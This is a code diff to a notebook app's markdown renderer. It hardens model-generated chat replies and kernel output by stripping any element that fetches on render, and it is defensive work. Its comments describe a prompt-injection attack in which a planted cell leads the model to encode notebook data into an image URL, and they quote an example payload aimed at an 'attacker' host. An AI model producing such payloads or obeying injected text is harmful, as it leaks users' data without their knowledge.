@@ -4,6 +4,7 @@ import type { Config } from 'dompurify';
 import katexPlugin from '@vscode/markdown-it-katex';
 import type { MarkdownKatexOptions } from '@vscode/markdown-it-katex';
 import type { KatexOptions } from 'katex';
+import { noFetchImages } from '$lib/markdownNoFetch';
 // KaTeX's stylesheet, bundled (never a CDN): Vite emits it into the app CSS and
 // rewrites its `url(fonts/KaTeX_*)` references to hashed assets it copies into
 // the build, so the packaged `cellar` serves the fonts itself and math renders
@@ -33,6 +34,19 @@ const md = newEngine();
 // `text/latex` output is a separate feature keyed on the output's MIME type - not
 // $-scanning arbitrary cells - and is deliberately not this path.
 const mdOutput = newEngine();
+
+// The engine for a MODEL-GENERATED chat reply: authored-prose shape (a reply is
+// prose, and `$x$` in one means math, so the math plugin is installed on it
+// below) but rendered as OUTPUT - so it carries the same no-fetch image rule as
+// `mdOutput`. It is a third engine rather than a flag on `md` precisely because
+// `md` renders the user's OWN markdown cells, whose images must keep loading.
+const mdChat = newEngine();
+
+// Every engine that renders MACHINE-EMITTED markdown installs the one shared
+// no-fetch rule (`$lib/markdownNoFetch`, which owns the reasoning and is shared
+// with the HTML export's own markdown-it). `md` - authored cells - is untouched.
+noFetchImages(mdOutput);
+noFetchImages(mdChat);
 
 /**
  * TeX math options, KaTeX via `@vscode/markdown-it-katex` (the plugin VS Code's
@@ -103,6 +117,7 @@ const mathPlugin: KatexPlugin =
 	(katexPlugin as unknown as { default?: KatexPlugin }).default ?? katexPlugin;
 
 md.use(mathPlugin, MATH_OPTIONS);
+mdChat.use(mathPlugin, MATH_OPTIONS);
 
 /**
  * The one sanitizer extension, and it is deliberately two tag names wide.
@@ -133,77 +148,35 @@ export const MARKDOWN_SANITIZE_CONFIG: Config = {
 };
 
 /**
- * The SECOND declared profile, for a MODEL-GENERATED chat reply - the one
- * markdown surface whose author is not the user.
+ * The SECOND declared profile, for MACHINE-EMITTED markdown OUTPUT - the
+ * markdown Cellar renders whose author is not the user (a model's chat reply, a
+ * kernel's `display(Markdown(...))`).
  *
- * It closes the markdown-image exfiltration vector: a reply rendered with the
- * profile above would fetch `![](https://attacker/?d=<data>)` the instant the
- * cell renders, and again on every reload, since the reply is persisted as
- * `display_data`. The reply is generated from a transcript built out of cell
- * SOURCE and stored OUTPUT, which can include content the user never wrote (a
- * downloaded notebook, an agent-written cell, a `print()` of fetched data), so a
- * prompt-injecting cell can steer the model into encoding ANOTHER cell's content
- * into an image URL - a zero-click outbound request carrying notebook data,
- * dressed as the answer the user is reading.
+ * It is the sanitizer half of the no-fetch rule `$lib/markdownNoFetch` states in
+ * full: no element that fetches on render may survive an output render, because
+ * such an output can carry a URL the user never wrote, and requesting it leaks
+ * notebook data with no click - in an exported report, from a READER's browser.
+ * The markdown-it rule turns an image into its alt text; this profile is what
+ * makes the guarantee hold for anything markdown-it might ever emit besides,
+ * which is why the media tags are forbidden as a SET rather than one-by-one.
  *
- * So no element that fetches on render may survive. `html:false` upstream means
- * markdown-it can only ever emit `<img>` here, but the media tags are forbidden
- * as a set rather than one-by-one, so a future markdown-it rule cannot add a
- * fetching element behind this profile's back. `<a>` stays clickable and
- * untouched: a click is deliberate, which is the whole distinction.
- *
- * Deliberately NOT same-origin-only: a tool-less chat reply has no legitimate
- * inline image to preserve, so removing them completely is both simpler and a
- * complete close of the channel. And deliberately scoped to THIS profile: an
- * authored markdown cell is a different trust class, and its rendering is
- * byte-unchanged.
+ * `<a>` stays clickable and untouched: a click is deliberate. And the profile is
+ * scoped to OUTPUT renderers - an authored markdown cell is a different trust
+ * class, and its rendering is byte-unchanged.
  */
-const CHAT_REPLY_SANITIZE_CONFIG: Config = {
+const OUTPUT_SANITIZE_CONFIG: Config = {
 	...MARKDOWN_SANITIZE_CONFIG,
 	FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'track', 'embed', 'object', 'iframe', 'input']
 };
 
 /**
- * Leave, in an `<img>`'s place, what it SAYS rather than dropping it silently:
- * its alt text, or the URL as plain text when there is none. Text cannot fetch
- * and cannot be clicked into a fetch, so the reader still sees that the model
- * referenced something and what it referenced.
- *
- * The text is INSERTED beside the image and the image itself is left for
- * DOMPurify to remove (the profile above forbids the tag). Two reasons: the
- * removal stays the sanitizer's, so a miss here degrades to "gone" and never to
- * "loaded"; and detaching a node mid-traversal is what DOMPurify refuses to
- * sanitize around ("could not be detached from its tree").
- */
-function annotateImage(node: Element): void {
-	const alt = (node.getAttribute('alt') || '').trim();
-	const src = (node.getAttribute('src') || '').trim();
-	const label = alt || src;
-	if (!label) return;
-	node.parentNode?.insertBefore(node.ownerDocument.createTextNode(label), node);
-}
-
-/**
  * The ONE sanitize call site: every renderer below funnels through it, so the
- * two configs above are the whole security surface for every markdown surface.
- *
- * The chat profile also needs a per-element rewrite (an `<img>` becomes its own
- * text), which DOMPurify expresses as a hook. Hooks are instance-global, so it
- * is added and removed AROUND this one synchronous call - `sanitize` cannot be
- * re-entered (nothing it calls renders markdown), so no other surface can ever
- * observe it.
+ * two configs above are the whole security surface for every markdown surface -
+ * `MARKDOWN_SANITIZE_CONFIG` for content the USER authored, and
+ * `OUTPUT_SANITIZE_CONFIG` for machine-emitted output.
  */
 function sanitize(html: string, config: Config = MARKDOWN_SANITIZE_CONFIG): string {
-	if (config !== CHAT_REPLY_SANITIZE_CONFIG) return DOMPurify.sanitize(html, config);
-	DOMPurify.addHook('uponSanitizeElement', (node) => {
-		const el = node as Element;
-		if (el.tagName?.toLowerCase() === 'img') annotateImage(el);
-	});
-	try {
-		return DOMPurify.sanitize(html, config);
-	} finally {
-		DOMPurify.removeHook('uponSanitizeElement');
-	}
+	return DOMPurify.sanitize(html, config);
 }
 
 /** Render AUTHORED markdown (notebook markdown cells, `.md` previews): math included. */
@@ -212,12 +185,12 @@ export function renderMarkdown(src: string | null | undefined): string {
 }
 
 /**
- * Render a MODEL-GENERATED chat reply: the authored-prose engine (a reply is
- * prose, and `$x$` in one means math), sanitized through
- * {@link CHAT_REPLY_SANITIZE_CONFIG} so nothing in it fetches on render.
+ * Render a MODEL-GENERATED chat reply: prose (math on, unlike other output -
+ * `$x$` in a reply means math), through the OUTPUT engine + profile, so nothing
+ * in it fetches on render.
  */
 export function renderChatReply(src: string | null | undefined): string {
-	return sanitize(md.render(src || ''), CHAT_REPLY_SANITIZE_CONFIG);
+	return sanitize(mdChat.render(src || ''), OUTPUT_SANITIZE_CONFIG);
 }
 
 /**
@@ -227,5 +200,5 @@ export function renderChatReply(src: string | null | undefined): string {
  * content class rather than a second, drifting renderer.
  */
 export function renderOutputMarkdown(src: string | null | undefined): string {
-	return sanitize(mdOutput.render(src || ''));
+	return sanitize(mdOutput.render(src || ''), OUTPUT_SANITIZE_CONFIG);
 }
